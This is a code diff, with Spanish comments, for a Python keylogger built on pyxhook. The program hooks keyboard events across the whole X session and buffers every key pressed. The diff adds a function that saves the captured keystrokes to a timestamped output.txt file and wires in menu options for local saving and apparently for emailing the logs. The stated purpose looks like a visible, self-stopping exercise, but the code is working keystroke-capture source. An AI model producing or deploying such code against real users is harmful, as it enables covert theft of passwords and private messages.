@@ -2,17 +2,19 @@ import pyxhook
 import time
 import sys
 import termios
+from datetime import datetime
 
 class Keyloggerore:
-    def __init__(self):
+    def __init__(self, enviar_correo=False, guardar_local=False):
         self.buffer = "" # Registro de pulsaciones
         self.running = True
+        self.enviar_correo = enviar_correo
+        self.guardar_local = guardar_local
+        self.archivo_output = "output.txt" 
 
     ### Funcion (MODIFICADA) de https://github.com/JeffHoogland/pyxhook/blob/master/example.py
     # This function is called every time a key is presssed
-    def callback(self,event):
-        global running, buffers
-        
+    def callback(self, event):
         if hasattr(event, 'Key'): # se toma event.Key (los otros son: event.KeyID, event.Ascii)
             self.buffer += event.Key
             
@@ -22,20 +24,36 @@ class Keyloggerore:
 
         # If the "string" value matches spacebar, terminate the while loop
         if "exit" in self.buffer.lower():
-    
             print("\n[x] Se detecto 'exit'. Finalizando keylogger.")
             termios.tcflush(sys.stdin, termios.TCIFLUSH) # Limpiar terminal
-            # Mientras se ejecuta el programa tambien se registran las 
-            # pulsaciones en la misma terminal, las cuales forman una cola 
-            # de teclas que esperan su turno para ser procesadas
-            running = False
-            self.buffer = ""
             
+            # PRIMERO se guarda el archivo con el buffer completo
+            if self.guardar_local:
+                self.guardar_archivo_local()
+            
+            # DESPUÉS se limpia y detener
+            self.running = False
+            
+    def guardar_archivo_local(self):
+        try:
+            contenido = "============= REGISTRO DE KEYLOGGER =============\n"
+            contenido += f"Fecha de generación: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+            contenido +="=================================================\n"
+            contenido += "Eventos registrados:\n"
+            contenido += self.buffer
+            contenido +="\n=================================================\n"
+            contenido += "FIN DEL REGISTRO\n"
+            
+            with open(self.archivo_output, 'w', encoding='utf-8') as archivo:
+                archivo.write(contenido)
+                
+            print(f"Registros guardados exitosamente en: {self.archivo_output}")
+            print(f"Archivo creado con {len(self.buffer)} caracteres registrados")
+            
+        except Exception as e:
+            print(f"Error al guardar el archivo local: {e}")
                     
-def mostrar_menu():
-    enviar_correo = False
-    guardar_texto_plano = False
-    
+def mostrar_menu():    
     print("============= Configuracion del keylogger. =============")
     print("Instrucciones: Responde 'yes'/'y' para SI, 'no'/'n' para NO, o 'exit' para salir")
     print()
@@ -64,7 +82,7 @@ def mostrar_menu():
         opcion_texto = input("Respuesta: ").strip().lower()
         
         if opcion_texto == 'exit':
-            print("\n[x] Saliendo del programa...")
+            print("\n[x] Saliendo del programa.")
             sys.exit(0)
         elif opcion_texto in ['yes', 'y']:
             guardar_texto_plano = True
@@ -86,8 +104,10 @@ if __name__ == "__main__":
     enviar_correo, guardar_local = mostrar_menu()
     
     print("============= Keylogger iniciado. =============")
+    print("INSTRUCCIONES: Escribe 'exit' para terminar el programa")
+    print()
     
-    logger = Keyloggerore()
+    logger = Keyloggerore(enviar_correo=enviar_correo, guardar_local=guardar_local)
     
     try:
         ### codigo tomado de https://github.com/JeffHoogland/pyxhook/blob/master/example.py
@@ -101,18 +121,19 @@ if __name__ == "__main__":
         hookman.start()
 
         # Create a loop to keep the application running
-        running = True
-        while running:
+        while logger.running:
             time.sleep(0.1)
             
     except KeyboardInterrupt:
         print("\n[x] Programa interrumpido por Ctrl+C.")
-        running = False
-        buffer = ""
+
+    if guardar_local and logger.buffer and logger.running == False:
+        # solo si no se guardo ya en el callback
+        if "exit" not in logger.buffer.lower():
+            print("Guardando registros finales.")
+            logger.guardar_archivo_local()
 
     # Close the listener when we are done
     hookman.cancel()
-    ### fin de example.py
     
     print("============= Keylogger detenido. =============")
-
